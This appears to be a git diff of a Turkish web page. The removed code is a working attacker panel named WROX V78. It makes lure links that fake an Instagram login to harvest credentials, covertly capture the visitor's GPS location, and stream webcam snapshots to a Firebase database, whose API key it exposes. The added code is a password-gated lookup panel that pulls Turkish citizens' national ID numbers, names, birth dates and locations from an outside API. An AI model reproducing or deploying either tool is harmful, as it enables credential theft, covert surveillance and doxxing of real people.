@@ -3,214 +3,280 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V78 - FREE ACCESS</title>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
-
+    <title>VIP Sorgu Paneli | Efecan1903</title>
     <style>
-        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --green: #2ecc71; --red: #ff0000; }
-        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
-        
-        /* GİRİŞ & KAYIT */
-        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, #05191a 0%, #000 100%); }
-        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: rgba(10, 10, 10, 0.95); box-shadow: 0 0 20px rgba(0, 240, 255, 0.2); }
-        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; border-radius: 8px; transition: 0.3s; }
-        button:hover { background: var(--neon); color: #000; }
-        .reg-btn { margin-top: 12px; border-color: #444; color: #777; font-size: 11px; }
+        /* CSS Başlangıç */
+        :root {
+            --dark: #0a0a0a;
+            --accent: #16213e;
+            --blue: #0f3460;
+            --text: #00ff41; /* Hacker Green */
+            --white: #ffffff;
+        }
 
-        /* PANEL YAPISI */
-        #main-panel { display: none; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
-        .nav-menu { position: fixed; top: 60px; left: -100%; width: 240px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.4s; z-index: 99; }
-        .nav-menu.active { left: 0; }
-        .nav-menu div { padding: 20px; border-bottom: 1px solid #1a1a1a; cursor: pointer; color: var(--neon); font-size: 13px; font-weight: bold; }
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            background-color: var(--dark);
+            /* Teknoloji Arka Planı */
+            background-image: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://w0.peakpx.com/wallpaper/559/594/壓屏-wallpaper-cyber-circuit-board-tech.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+            color: var(--white);
+            overflow-x: hidden;
+        }
 
-        /* SEKMELER VE AKIŞ */
-        .tab-content { display: none; padding: 20px; animation: fadeIn 0.5s; }
-        .tab-content.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        /* Hamburger Menü */
+        .menu-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+            cursor: pointer;
+            background: var(--text);
+            color: black;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            box-shadow: 0 0 15px var(--text);
+        }
 
-        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
-        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 500px; overflow-y: auto; padding-right: 5px; }
-        .feed-item { border: 1px solid #222; border-radius: 12px; padding: 12px; background: #000; font-size: 11px; }
-        .feed-item img { width: 100%; border-radius: 8px; margin-top: 8px; border: 1px solid #333; }
+        .sidebar {
+            position: fixed;
+            left: -280px;
+            width: 260px;
+            height: 100%;
+            background: rgba(22, 33, 62, 0.95);
+            backdrop-filter: blur(10px);
+            transition: 0.4s;
+            padding-top: 80px;
+            z-index: 999;
+            border-right: 2px solid var(--text);
+        }
 
-        .link-box { background: #111; padding: 12px; font-size: 10px; word-break: break-all; margin: 15px 0; border: 1px dashed var(--neon); color: var(--neon); border-radius: 5px; display: none; }
-        
-        /* Kaydırma Çubuğu */
-        .feed-wrapper::-webkit-scrollbar { width: 4px; }
-        .feed-wrapper::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
+        .sidebar.active { left: 0; }
+        .sidebar ul { list-style: none; padding: 0; }
+        .sidebar ul li {
+            padding: 15px 25px;
+            border-bottom: 1px solid #00ff4133;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .sidebar ul li:hover { background: var(--text); color: black; }
+
+        /* Ana İçerik */
+        .container {
+            max-width: 800px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .card {
+            background: rgba(22, 33, 62, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid var(--text);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            display: none;
+        }
+
+        input {
+            width: 80%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid var(--text);
+            background: #050505;
+            color: var(--text);
+            font-size: 16px;
+        }
+
+        .adsoyad-inputs { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
+        .adsoyad-inputs input { width: 45%; }
+
+        button {
+            padding: 12px 30px;
+            background: var(--text);
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            box-shadow: 0 0 10px var(--text);
+        }
+
+        #results {
+            margin-top: 30px;
+            text-align: left;
+            background: rgba(15, 52, 96, 0.9);
+            border: 1px dashed var(--text);
+            border-radius: 10px;
+            padding: 15px;
+            display: none;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .result-item {
+            border-bottom: 1px solid #00ff4133;
+            padding: 10px 0;
+        }
+
+        /* Şifre Ekranı */
+        #login-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        /* Müzik Kontrol (Opsiyonel Görünürlük) */
+        #audio-player {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.3;
+        }
     </style>
 </head>
 <body>
 
-    <div id="auth-screen">
-        <div class="auth-box">
-            <h1 style="color: var(--neon); font-size: 26px; margin: 0 0 20px 0;">WROX V78</h1>
-            <input type="text" id="email" placeholder="E-posta Adresiniz">
-            <input type="password" id="pass" placeholder="Şifreniz">
-            <button onclick="auth('login')">SİSTEME GİRİŞ YAP</button>
-            <button class="reg-btn" onclick="auth('register')">ÜCRETSİZ KAYIT OL</button>
+    <audio id="bg-music" loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+
+    <div id="login-screen">
+        <div class="card" style="display:block;">
+            <h2>🔐 VIP ACCESS REQUIRED</h2>
+            <input type="password" id="vip-pass" placeholder="Password...">
+            <br>
+            <button onclick="checkLogin()">UNLOCK</button>
         </div>
     </div>
 
-    <div id="main-panel">
-        <div class="header">
-            <div onclick="toggleMenu()" style="cursor:pointer; font-size:24px;">☰ WROX <span style="color:#3498db">V78</span></div>
-            <div id="user-tag" style="color: var(--green); font-size: 10px; font-weight: bold;"></div>
+    <div class="menu-btn" onclick="toggleMenu()">☰ MENU</div>
+
+    <nav class="sidebar" id="sidebar">
+        <ul>
+            <li onclick="showSection('tc-section')">🔍 TC Sorgula</li>
+            <li onclick="showSection('adsoyad-section')">👤 Ad Soyad Sorgula</li>
+            <li onclick="showSection('gsm-section')">📞 GSM'den TC</li>
+            <li onclick="showSection('extra-section')">🏢 Diğer Sorgular</li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <h1 id="main-title" style="color: var(--text); text-shadow: 0 0 10px var(--text);">SYSTEM ONLINE</h1>
+        
+        <div id="tc-section" class="card">
+            <h3>TC Kimlik Sorgula</h3>
+            <input type="text" id="tc-input" placeholder="11 Haneli TC Girin">
+            <button onclick="apiCall('tc.php', 'tc', 'tc-input')">Sorgula</button>
         </div>
 
-        <div id="side-menu" class="nav-menu">
-            <div onclick="showTab('cam-tab')">📸 KAMERA SIZMA (BURST)</div>
-            <div onclick="showTab('loc-tab')">📍 KONUM TAKİP (GPS)</div>
-            <div onclick="showTab('ig-tab')">🔗 INSTAGRAM PHISHING</div>
-        </div>
-
-        <div id="cam-tab" class="tab-content active">
-            <h3>📷 KAMERA ÜNİTESİ</h3>
-            <button onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
-            <div id="cam-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">🔴 CANLI GÖRÜNTÜ AKIŞI:</div>
-                <div id="cam-feed" class="feed-wrapper"></div>
+        <div id="adsoyad-section" class="card">
+            <h3>Ad Soyad Filtreli Sorgu</h3>
+            <div class="adsoyad-inputs">
+                <input type="text" id="as-ad" placeholder="Ad">
+                <input type="text" id="as-soyad" placeholder="Soyad">
+                <input type="text" id="as-il" placeholder="İl">
+                <input type="text" id="as-ilce" placeholder="İlçe">
             </div>
+            <button onclick="adSoyadCall()">Sorgula</button>
         </div>
 
-        <div id="loc-tab" class="tab-content">
-            <h3>📍 KONUM TAKİBİ</h3>
-            <button onclick="genLink('loc')">GPS KONUM LİNKİ OLUŞTUR</button>
-            <div id="loc-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">📌 SON KONUMLAR:</div>
-                <div id="loc-feed" class="feed-wrapper"></div>
-            </div>
+        <div id="gsm-section" class="card">
+            <h3>GSM'den TC Sorgula</h3>
+            <input type="text" id="gsm-input" placeholder="5XXXXXXXXX">
+            <button onclick="apiCall('gsmtc.php', 'gsm', 'gsm-input')">Sorgula</button>
         </div>
 
-        <div id="ig-tab" class="tab-content">
-            <h3>🔑 INSTAGRAM PANEL</h3>
-            <button onclick="genLink('ig')">SAHTE IG LİNKİ OLUŞTUR</button>
-            <div id="ig-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">👤 DÜŞEN HESAP BİLGİLERİ:</div>
-                <div id="ig-feed" class="feed-wrapper"></div>
-            </div>
-        </div>
+        <div id="results"></div>
     </div>
 
     <script>
-        // 1. FIREBASE KONFİGÜRASYONU
-        const firebaseConfig = {
-            apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
-            databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
-            projectId: "wrox-premium",
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const API_BASE = "https://arastir.sbs/api";
 
-        let activeUser = "";
-
-        // 2. GİRİŞ VE ÜCRETSİZ KAYIT MANTIĞI
-        function auth(type) {
-            const emailInput = document.getElementById('email').value.trim();
-            const passInput = document.getElementById('pass').value;
-            const userID = emailInput.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
-
-            if (!emailInput || !passInput) return alert("Bilgileri doldurun!");
-
-            // Admin Giriş Kontrolü (AFAVAN66 Özel)
-            if (emailInput === "E-POSTA" && passInput === "ŞİFRE") {
-                activeUser = "ADINI YAZ";
-                startApp(true);
-                return;
-            }
-
-            if (type === 'register') {
-                db.ref('users/' + userID).set({ p: passInput, e: emailInput })
-                  .then(() => alert("Ücretsiz kaydınız tamamlandı! Giriş yapabilirsiniz."));
+        function checkLogin() {
+            const pass = document.getElementById('vip-pass').value;
+            const music = document.getElementById('bg-music');
+            if(pass === "Efecan1903") {
+                document.getElementById('login-screen').style.display = 'none';
+                // Müzik çalmaya başla (Kullanıcı etkileşimi olduğu için tarayıcı izin verir)
+                music.play().catch(e => console.log("Müzik otomatik başlatılamadı."));
             } else {
-                db.ref('users/' + userID).once('value').then(s => {
-                    if (s.exists() && s.val().p === passInput) {
-                        activeUser = userID;
-                        startApp(false);
-                    } else { alert("Hatalı e-posta veya şifre!"); }
-                });
+                alert("ACCESS DENIED!");
             }
         }
 
-        function startApp(isAdmin) {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('user-tag').innerText = (isAdmin ? "ADMİN: " : "USER: ") + activeUser.toUpperCase();
-            
-            // VERİLERİ DİNLE VE PANELİ GÜNCELLE
-            db.ref('logs/' + activeUser).on('child_added', s => {
-                const val = s.val();
-                let html = `<div class="feed-item"><b>⏱ ${new Date(val.t).toLocaleTimeString()}</b><br>`;
-                
-                if (val.type === 'cam') {
-                    html += `<img src="${val.d}"></div>`;
-                    document.getElementById('cam-feed').insertAdjacentHTML('afterbegin', html);
-                } else if (val.type === 'loc') {
-                    html += `<a href="${val.d}" target="_blank" style="color:#f1c40f; text-decoration:none;">📍 HARİTADA GÖRÜNTÜLE (TIKLA)</a></div>`;
-                    document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
-                } else if (val.type === 'ig') {
-                    html += `<span style="color:var(--green)">Kullanıcı: ${val.u}</span><br><span style="color:var(--red)">Şifre: ${val.p}</span></div>`;
-                    document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
-                }
-            });
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('active');
         }
 
-        // PANEL YÖNETİMİ
-        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
-        function showTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
+        function showSection(id) {
+            document.querySelectorAll('.card').forEach(c => c.style.display = 'none');
+            document.getElementById(id).style.display = 'block';
+            document.getElementById('results').style.display = 'none';
             toggleMenu();
         }
 
-        function genLink(mode) {
-            const link = window.location.href.split('?')[0] + `?ref=${activeUser}&m=${mode}`;
-            const box = document.getElementById(mode + '-link');
-            box.innerText = link; box.style.display = 'block';
+        async function apiCall(endpoint, paramName, inputId) {
+            const val = document.getElementById(inputId).value;
+            const resDiv = document.getElementById('results');
+            resDiv.style.display = 'block';
+            resDiv.innerHTML = "🌀 Processing...";
+
+            try {
+                const response = await fetch(`${API_BASE}/${endpoint}?${paramName}=${val}`);
+                const data = await response.json();
+                renderResults(data);
+            } catch (e) {
+                resDiv.innerHTML = "❌ Connection Error.";
+            }
         }
 
-        // 3. KURBAN MODLARI (LİNK AÇILDIĞINDA ÇALIŞIR)
-        const params = new URLSearchParams(window.location.search);
-        const ref = params.get('ref');
-        const mode = params.get('m');
+        async function adSoyadCall() {
+            const ad = document.getElementById('as-ad').value;
+            const soyad = document.getElementById('as-soyad').value;
+            const il = document.getElementById('as-il').value;
+            const ilce = document.getElementById('as-ilce').value;
+            
+            const resDiv = document.getElementById('results');
+            resDiv.style.display = 'block';
+            resDiv.innerHTML = "🌀 Accessing Database...";
 
-        if (ref && mode) {
-            if (mode === 'ig') {
-                document.body.innerHTML = `
-                <div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px; font-family:sans-serif;">
-                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="180">
-                    <input id="iu" placeholder="Kullanıcı adı" style="width:280px; padding:12px; margin-top:35px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
-                    <input id="ip" type="password" placeholder="Şifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
-                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; border-radius:4px; font-weight:bold; cursor:pointer;">Giriş Yap</button>
-                    <p style="color:#00376b; font-size:12px; margin-top:30px; font-weight:bold;">Şifreni mi unuttun?</p>
-                </div>`;
-                window.sendIG = () => {
-                    db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
-                    location.href = "https://instagram.com";
-                };
-            } else if (mode === 'loc') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">Bağlantı bekleniyor...</div>`;
-                navigator.geolocation.getCurrentPosition(p => {
-                    const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    db.ref('logs/'+ref).push({type:'loc', d:url, t:Date.now()});
-                });
-            } else if (mode === 'cam') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#111; display:flex; align-items:center; justify-content:center;">İşlem devam ediyor...</div>`;
-                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-                    const v = document.createElement('video'); v.srcObject=s; v.play();
-                    const c = document.createElement('canvas');
-                    setInterval(() => {
-                        c.width=v.videoWidth; c.height=v.videoHeight;
-                        c.getContext('2d').drawImage(v,0,0);
-                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/webp', 0.4), t:Date.now()});
-                    }, 4000);
-                });
+            let url = `${API_BASE}/adsoyad.php?adi=${ad}&soyadi=${soyad}`;
+            if(il) url += `&il=${il}`;
+            if(ilce) url += `&ilce=${ilce}`;
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                renderResults(data);
+            } catch (e) {
+                resDiv.innerHTML = "❌ System Error.";
+            }
+        }
+
+        function renderResults(data) {
+            const resDiv = document.getElementById('results');
+            if(data.success === "true") {
+                if(data.data) {
+                    let html = `<b>Total Records: ${data.data.length}</b><br><br>`;
+                    data.data.forEach(i => {
+                        html += `<div class="result-item">👤 ${i.ADI} ${i.SOYADI}<br>🆔 ${i.TC}<br>📍 ${i.NUFUSIL} / ${i.NUFUSILCE}</div>`;
+                    });
+                    resDiv.innerHTML = html;
+                } else {
+                    resDiv.innerHTML = `✅ <b>FOUND:</b><br>Name: ${data.ADI} ${data.SOYADI}<br>TC: ${data.TC}<br>Born: ${data.DOGUMTARIHI}`;
+                }
+            } else {
+                resDiv.innerHTML = "❌ No Record Found.";
             }
         }
     </script>
